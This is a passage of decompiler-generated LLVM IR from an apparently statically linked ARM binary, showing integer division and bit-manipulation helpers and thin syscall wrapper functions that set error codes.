  %v1_108e4 = phi i32 [ %v1_108d8, %dec_label_pc_108d0 ], [ %v3_108d8, %bb84 ]
  %v4_108dc = udiv i32 %v1_10908, 2
  %v6_108dc = icmp ult i32 %v1_108e0, %v4_108dc
  br i1 %v6_108dc, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_108e0 = urem i32 %v1_10908, 2
  %v4_108e0 = icmp eq i32 %v3_108e0, 0
  %v6_108e0 = sub i32 %v1_108e0, %v4_108dc
  br i1 %v4_108e0, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_108e4 = udiv i32 %v1_10904, 2
  %v6_108e4 = or i32 %v1_108e4, %v5_108e4
  store i32 %v6_108e4, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_108ec = phi i32 [ %v6_108e0, %bb85 ], [ %v1_108e0, %.thread7 ], [ %v6_108e0, %bb86 ]
  %v1_108f0 = phi i32 [ %v1_108e4, %bb85 ], [ %v1_108e4, %.thread7 ], [ %v6_108e4, %bb86 ]
  %v4_108e8 = udiv i32 %v1_10908, 4
  %v6_108e8 = icmp ult i32 %v1_108ec, %v4_108e8
  br i1 %v6_108e8, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_108ec = and i32 %v1_10908, 2
  %v4_108ec = icmp eq i32 %v3_108ec, 0
  %v6_108ec = sub i32 %v1_108ec, %v4_108e8
  br i1 %v4_108ec, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_108f0 = udiv i32 %v1_10904, 4
  %v6_108f0 = or i32 %v1_108f0, %v5_108f0
  store i32 %v6_108f0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_108f8 = phi i32 [ %v6_108ec, %bb87 ], [ %v1_108ec, %.thread8 ], [ %v6_108ec, %bb88 ]
  %v1_108fc = phi i32 [ %v1_108f0, %bb87 ], [ %v1_108f0, %.thread8 ], [ %v6_108f0, %bb88 ]
  %v4_108f4 = udiv i32 %v1_10908, 8
  %v6_108f4 = icmp ult i32 %v1_108f8, %v4_108f4
  br i1 %v6_108f4, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_108f8 = and i32 %v1_10908, 4
  %v4_108f8 = icmp eq i32 %v3_108f8, 0
  %v6_108f8 = sub i32 %v1_108f8, %v4_108f4
  br i1 %v4_108f8, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_108fc = udiv i32 %v1_10904, 8
  %v6_108fc = or i32 %v1_108fc, %v5_108fc
  store i32 %v6_108fc, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10910 = phi i32 [ %v1_108fc, %bb89 ], [ %v1_108fc, %.thread9 ], [ %v6_108fc, %bb90 ]
  %v0_10900 = phi i32 [ %v6_108f8, %bb89 ], [ %v1_108f8, %.thread9 ], [ %v6_108f8, %bb90 ]
  %v2_10900 = icmp eq i32 %v0_10900, 0
  br i1 %v2_10900, label %dec_label_pc_10910, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10904, 16
  br i1 %tmp138, label %dec_label_pc_10910, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10904 = udiv i32 %v1_10904, 16
  %v4_10908 = udiv i32 %v1_10908, 16
  br label %dec_label_pc_108d0

dec_label_pc_10910:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_10910

dec_label_pc_10918:                               ; preds = %dec_label_pc_10884
  %v9_10884 = icmp eq i32 %v0_10884, %v1_10884
  %. = zext i1 %v9_10884 to i32
  ret i32 %.

dec_label_pc_10924:                               ; preds = %dec_label_pc_1088c
  %v2_10924 = icmp ugt i32 %v1_10884, 65535
  br i1 %v2_10924, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10924
  %v2_10928 = and i32 %v1_10884, 32768
  %v3_10928 = icmp eq i32 %v2_10928, 0
  %v4_10928 = udiv i32 %v1_10884, 65536
  br i1 %v3_10928, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10924
  %v0_1093465 = phi i32 [ %v1_10884, %dec_label_pc_10924 ], [ %v4_10928, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_10938 = phi i32 [ %v0_1093465, %.thread16 ], [ %v4_10928, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10934 = icmp ugt i32 %v1_10938, 255
  br i1 %v2_10934, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_10938 = and i32 %v1_10938, 128
  %v3_10938 = icmp eq i32 %v2_10938, 0
  %v4_10938 = udiv i32 %v1_10938, 256
  br i1 %v3_10938, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_1093c = or i32 %storemerge, 8
  store i32 %v2_1093c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_10948 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_1093c, %bb98 ]
  %v1_10944 = phi i32 [ %v1_10938, %bb96 ], [ %v4_10938, %bb97 ], [ %v4_10938, %bb98 ]
  %v2_10940 = icmp ugt i32 %v1_10944, 15
  br i1 %v2_10940, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10944 = and i32 %v1_10944, 8
  %v3_10944 = icmp eq i32 %v2_10944, 0
  %v4_10944 = udiv i32 %v1_10944, 16
  br i1 %v3_10944, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_10948 = add nsw i32 %v1_10948, 4
  store i32 %v2_10948, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10950 = phi i32 [ %v1_10948, %.thread17 ], [ %v1_10948, %bb99 ], [ %v2_10948, %bb100 ]
  %v5_10954 = phi i32 [ %v1_10944, %.thread17 ], [ %v4_10944, %bb99 ], [ %v4_10944, %bb100 ]
  %v2_1094c = icmp ugt i32 %v5_10954, 3
  %v7_1094c = icmp eq i32 %v5_10954, 4
  %v2_10950 = xor i1 %v7_1094c, true
  %v3_10950 = and i1 %v2_1094c, %v2_10950
  br i1 %v3_10950, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10950 = add nsw i32 %v4_10950, 3
  store i32 %v5_10950, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10954 = phi i32 [ %v4_10950, %.thread18 ], [ %v5_10950, %bb101 ]
  %v2_10954 = xor i1 %v2_1094c, true
  %v3_10954 = or i1 %v7_1094c, %v2_10954
  br i1 %v3_10954, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10954 = udiv i32 %v5_10954, 2
  %v9_10954 = add i32 %v4_10954, %v8_10954
  store i32 %v9_10954, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_10958 = phi i32 [ %v4_10954, %bb102 ], [ %v9_10954, %bb103 ]
  %v6_10958 = lshr i32 %v0_10884, %v1_10958
  ret i32 %v6_10958

dec_label_pc_10960:                               ; preds = %dec_label_pc_10878
  %v0_10960 = load i32, i32* @lr, align 4
  %v0_10964 = call i32 @function_1098c()
  store i32 %v0_10960, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10954, { 1, 0 }
  uselistorder i1 %v7_1094c, { 1, 0 }
  uselistorder i32 %v4_10944, { 1, 0 }
  uselistorder i32 %v1_10944, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1093c, { 1, 0 }
  uselistorder i32 %v4_10938, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10938, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10928, { 1, 0 }
  uselistorder i32 %v0_10900, { 1, 0 }
  uselistorder i32 %v4_108f4, { 1, 0 }
  uselistorder i32 %v1_108fc, { 1, 2, 0 }
  uselistorder i32 %v4_108e8, { 1, 0 }
  uselistorder i32 %v1_108f0, { 1, 2, 0 }
  uselistorder i32 %v4_108dc, { 1, 0 }
  uselistorder i32 %v1_108e4, { 1, 2, 0 }
  uselistorder i32 %v1_10908, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_108d8, { 1, 0 }
  uselistorder i32 %v1_10904, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_108c4, { 1, 0 }
  uselistorder i32 %v3_108c0, { 1, 0 }
  uselistorder i32 %v1_108c0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_108c4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_108b0, { 1, 0 }
  uselistorder i32 %v4_108ac, { 2, 1, 0 }
  uselistorder i32 %v1_108b0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_108b8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_10884, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_10884, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_10878, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10910, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_108cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108b8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_10974(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10974:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_10978 = call i32 @function_10878()
  ret i32 %v0_10978
}

define i32 @function_1098c() local_unnamed_addr {
dec_label_pc_1098c:
  %v1_10994 = call i32 @function_1162c(i32 8)
  ret i32 %v1_10994
}

define i32 @function_109a0() local_unnamed_addr {
dec_label_pc_109a0:
  %v1_109b0 = load i32, i32* @r0, align 4
  ret i32 %v1_109b0
}

define i32 @function_109b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_109b4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109b4 = load i32, i32* @r7, align 4
  store i32 %v3_109b4, i32* %stack_var_-8, align 4
  %v0_109c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_109c0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_109c0, -4095
  br i1 %tmp, label %dec_label_pc_109e0, label %dec_label_pc_109d0

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109b4
  %v0_109d0 = call i32 @function_11204()
  %v0_109d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_109d4 = sub i32 0, %v0_109d4
  %v2_109d8 = inttoptr i32 %v0_109d0 to i32*
  store i32 %v1_109d4, i32* %v2_109d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_109e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_109e0

dec_label_pc_109e0:                               ; preds = %dec_label_pc_109b4, %dec_label_pc_109d0
  %v1_109e4 = phi i32 [ %v0_109c0, %dec_label_pc_109b4 ], [ -1, %dec_label_pc_109d0 ]
  %v2_109e0 = phi i32 [ %v3_109b4, %dec_label_pc_109b4 ], [ %v2_109e0.pre, %dec_label_pc_109d0 ]
  store i32 %v2_109e0, i32* @r7, align 4
  ret i32 %v1_109e4

; uselistorder directives
  uselistorder i32 %v0_109c0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_109e0, { 1, 0 }
}

define i32 @function_109e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_109e8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_109e8 = load i32, i32* @r2, align 4
  %v9_109e8 = load i32, i32* @r3, align 4
  store i32 %v9_109e8, i32* %stack_var_-4, align 4
  %v1_109f8 = and i32 %arg2, 64
  %v2_109f8 = icmp eq i32 %v1_109f8, 0
  br i1 %v2_109f8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_109e8
  %v3_10a00 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_10a00, i32* @r3, align 4
  %phitmp = urem i32 %v6_109e8, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_109e8, %bb
  %v0_10a04 = phi i32 [ 0, %dec_label_pc_109e8 ], [ %phitmp, %bb ]
  store i32 %v0_10a04, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10a34, label %dec_label_pc_10a24

dec_label_pc_10a24:                               ; preds = %.thread
  %v0_10a24 = call i32 @function_11204()
  %v0_10a28 = load i32, i32* %r7.global-to-local, align 4
  %v1_10a28 = sub i32 0, %v0_10a28
  store i32 %v1_10a28, i32* @r3, align 4
  %v2_10a2c = inttoptr i32 %v0_10a24 to i32*
  store i32 %v1_10a28, i32* %v2_10a2c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a34

dec_label_pc_10a34:                               ; preds = %.thread, %dec_label_pc_10a24
  %v0_10a34 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_10a24 ]
  ret i32 %v0_10a34

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10a34, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10a48() local_unnamed_addr {
dec_label_pc_10a48:
  %v1_10a58 = load i32, i32* @r0, align 4
  ret i32 %v1_10a58
}

define i32 @function_10a5c(i32* %arg1) local_unnamed_addr {
dec_label_pc_10a5c:
  %stack_var_-16 = alloca i32, align 4
  %v2_10a60 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10a70 = call i32 @function_10bdc(i32 %v2_10a60, i32 0)
  %v2_10a74 = load i32, i32* %stack_var_-16, align 4
  %v2_10a78 = icmp eq i32* %arg1, null
  br i1 %v2_10a78, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_10a5c
  store i32 %v2_10a74, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_10a5c, %bb
  ret i32 %v2_10a74

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_10a8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10a8c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10ac0, label %dec_label_pc_10ab0

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_10a8c
  %v0_10ab0 = call i32 @function_11204()
  %v0_10ab4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10ab4 = sub i32 0, %v0_10ab4
  %v2_10ab8 = inttoptr i32 %v0_10ab0 to i32*
  store i32 %v1_10ab4, i32* %v2_10ab8, align 4
  br label %dec_label_pc_10ac0

dec_label_pc_10ac0:                               ; preds = %dec_label_pc_10a8c, %dec_label_pc_10ab0
  %v1_10ac8 = phi i32 [ %arg1, %dec_label_pc_10a8c ], [ -1, %dec_label_pc_10ab0 ]
  ret i32 %v1_10ac8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ac0, { 1, 0 }
}

define i32 @function_10acc() local_unnamed_addr {
dec_label_pc_10acc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10acc = load i32, i32* @r7, align 4
  store i32 %v3_10acc, i32* %stack_var_-8, align 4
  %v0_10ad8 = load i32, i32* @r0, align 4
  store i32 %v0_10ad8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10ad8, -4095
  br i1 %tmp, label %dec_label_pc_10af8, label %dec_label_pc_10ae8

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10acc
  %v0_10ae8 = call i32 @function_11204()
  %v0_10aec = load i32, i32* %r7.global-to-local, align 4
  %v1_10aec = sub i32 0, %v0_10aec
  %v2_10af0 = inttoptr i32 %v0_10ae8 to i32*
  store i32 %v1_10aec, i32* %v2_10af0, align 4
  %v2_10af8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10acc, %dec_label_pc_10ae8
  %v1_10afc = phi i32 [ %v0_10ad8, %dec_label_pc_10acc ], [ -1, %dec_label_pc_10ae8 ]
  %v2_10af8 = phi i32 [ %v3_10acc, %dec_label_pc_10acc ], [ %v2_10af8.pre, %dec_label_pc_10ae8 ]
  store i32 %v2_10af8, i32* @r7, align 4
  ret i32 %v1_10afc

; uselistorder directives
  uselistorder i32 %v0_10ad8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10af8, { 1, 0 }
}

define i32 @function_10b00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10b00:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10b30, label %dec_label_pc_10b20

dec_label_pc_10b20:                               ; preds = %dec_label_pc_10b00
  %v0_10b20 = call i32 @function_11204()
  %v0_10b24 = load i32, i32* %r4.global-to-local, align 4
  %v1_10b24 = sub i32 0, %v0_10b24
  %v2_10b28 = inttoptr i32 %v0_10b20 to i32*
  store i32 %v1_10b24, i32* %v2_10b28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10b30

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10b00, %dec_label_pc_10b20
  %v0_10b30 = phi i32 [ %arg1, %dec_label_pc_10b00 ], [ -1, %dec_label_pc_10b20 ]
  ret i32 %v0_10b30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10b30, { 1, 0 }
}

define i32 @function_10b40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10b40:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b40 = load i32, i32* @r7, align 4
  store i32 %v3_10b40, i32* %stack_var_-8, align 4
  %v0_10b4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b4c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10b4c, -4095
  br i1 %tmp, label %dec_label_pc_10b6c, label %dec_label_pc_10b5c

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_10b40
  %v0_10b5c = call i32 @function_11204()
  %v0_10b60 = load i32, i32* %r7.global-to-local, align 4
  %v1_10b60 = sub i32 0, %v0_10b60
  store i32 %v1_10b60, i32* @r3, align 4
  %v2_10b64 = inttoptr i32 %v0_10b5c to i32*
  store i32 %v1_10b60, i32* %v2_10b64, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10b6c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10b6c

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b40, %dec_label_pc_10b5c
  %v1_10b70 = phi i32 [ %v0_10b4c, %dec_label_pc_10b40 ], [ -1, %dec_label_pc_10b5c ]
  %v2_10b6c = phi i32 [ %v3_10b40, %dec_label_pc_10b40 ], [ %v2_10b6c.pre, %dec_label_pc_10b5c ]
  store i32 %v2_10b6c, i32* @r7, align 4
  ret i32 %v1_10b70

; uselistorder directives
  uselistorder i32 %v0_10b4c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b6c, { 1, 0 }
}

define i32 @function_10b74(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b74:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b74 = load i32, i32* @r7, align 4
  store i32 %v3_10b74, i32* %stack_var_-8, align 4
  %v0_10b80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b80, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10b80, -4095
  br i1 %tmp, label %dec_label_pc_10ba0, label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b74
  %v0_10b90 = call i32 @function_11204()
  %v0_10b94 = load i32, i32* %r7.global-to-local, align 4
  %v1_10b94 = sub i32 0, %v0_10b94
  %v2_10b98 = inttoptr i32 %v0_10b90 to i32*
  store i32 %v1_10b94, i32* %v2_10b98, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10ba0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b74, %dec_label_pc_10b90
  %v1_10ba4 = phi i32 [ %v0_10b80, %dec_label_pc_10b74 ], [ -1, %dec_label_pc_10b90 ]
  %v2_10ba0 = phi i32 [ %v3_10b74, %dec_label_pc_10b74 ], [ %v2_10ba0.pre, %dec_label_pc_10b90 ]
  store i32 %v2_10ba0, i32* @r7, align 4
  ret i32 %v1_10ba4

; uselistorder directives
  uselistorder i32 %v0_10b80, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ba0, { 1, 0 }
}

define i32 @function_10ba8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10ba8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ba8 = load i32, i32* @r7, align 4
  store i32 %v3_10ba8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10bd0, label %dec_label_pc_10bc0

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10ba8
  %v0_10bc0 = call i32 @function_11204()
  %v0_10bc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10bc4 = sub i32 0, %v0_10bc4
  %v2_10bc8 = inttoptr i32 %v0_10bc0 to i32*
  store i32 %v1_10bc4, i32* %v2_10bc8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10bd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10ba8, %dec_label_pc_10bc0
  %v2_10bd4 = phi i32 [ %v3_10ba8, %dec_label_pc_10ba8 ], [ %v2_10bd4.pre, %dec_label_pc_10bc0 ]
  %v0_10bd0 = phi i32 [ %arg1, %dec_label_pc_10ba8 ], [ -1, %dec_label_pc_10bc0 ]
  store i32 %v2_10bd4, i32* @r7, align 4
  ret i32 %v0_10bd0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10bd0, { 1, 0 }
}

define i32 @function_10bdc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10bdc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10bdc = load i32, i32* @r7, align 4
  store i32 %v3_10bdc, i32* %stack_var_-8, align 4
  %v0_10be8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10be8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10be8, -4095
  br i1 %tmp, label %dec_label_pc_10c08, label %dec_label_pc_10bf8

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10bdc
  %v0_10bf8 = call i32 @function_11204()
  %v0_10bfc = load i32, i32* %r7.global-to-local, align 4
  %v1_10bfc = sub i32 0, %v0_10bfc
  store i32 %v1_10bfc, i32* @r3, align 4
  %v2_10c00 = inttoptr i32 %v0_10bf8 to i32*
  store i32 %v1_10bfc, i32* %v2_10c00, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c08.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c08

dec_label_pc_10c08:                               ; preds = %dec_label_pc_10bdc, %dec_label_pc_10bf8
  %v1_10c0c = phi i32 [ %v0_10be8, %dec_label_pc_10bdc ], [ -1, %dec_label_pc_10bf8 ]
  %v2_10c08 = phi i32 [ %v3_10bdc, %dec_label_pc_10bdc ], [ %v2_10c08.pre, %dec_label_pc_10bf8 ]
  store i32 %v2_10c08, i32* @r7, align 4
  ret i32 %v1_10c0c

; uselistorder directives
  uselistorder i32 %v0_10be8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c08, { 1, 0 }
}

define i32 @function_10c10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c10:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10c10 = load i32, i32* @r3, align 4
  store i32 %v9_10c10, i32* %stack_var_-4, align 4
  %v2_10c28 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10c28, i32* @r3, align 4
  %v0_10c4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10c4c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10c4c, -4095
  br i1 %tmp, label %dec_label_pc_10c6c, label %dec_label_pc_10c5c

dec_label_pc_10c5c:                               ; preds = %dec_label_pc_10c10
  %v0_10c5c = call i32 @function_11204()
  %v0_10c60 = load i32, i32* %r7.global-to-local, align 4
  %v1_10c60 = sub i32 0, %v0_10c60
  store i32 %v1_10c60, i32* @r3, align 4
  %v2_10c64 = inttoptr i32 %v0_10c5c to i32*
  store i32 %v1_10c60, i32* %v2_10c64, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c6c

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c10, %dec_label_pc_10c5c
  %v1_10c78 = phi i32 [ %v0_10c4c, %dec_label_pc_10c10 ], [ -1, %dec_label_pc_10c5c ]
  ret i32 %v1_10c78

; uselistorder directives
  uselistorder i32 %v0_10c4c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c6c, { 1, 0 }
}

define i32 @function_10c7c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10c7c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10cb8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cb8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cb8, -4095
  br i1 %tmp, label %dec_label_pc_10cd8, label %dec_label_pc_10cc8

dec_label_pc_10cc8:                               ; preds = %dec_label_pc_10c7c
  %v0_10cc8 = call i32 @function_11204()
  %v0_10ccc = load i32, i32* %r7.global-to-local, align 4
  %v1_10ccc = sub i32 0, %v0_10ccc
  %v2_10cd0 = inttoptr i32 %v0_10cc8 to i32*
  store i32 %v1_10ccc, i32* %v2_10cd0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd8

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10c7c, %dec_label_pc_10cc8
  %v1_10ce4 = phi i32 [ %v0_10cb8, %dec_label_pc_10c7c ], [ -1, %dec_label_pc_10cc8 ]
  ret i32 %v1_10ce4

; uselistorder directives
  uselistorder i32 %v0_10cb8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cd8, { 1, 0 }
}

define i32 @function_10ce8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10ce8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ce8 = load i32, i32* @r7, align 4
  store i32 %v3_10ce8, i32* %stack_var_-8, align 4
  %v0_10cf4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cf4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cf4, -4095
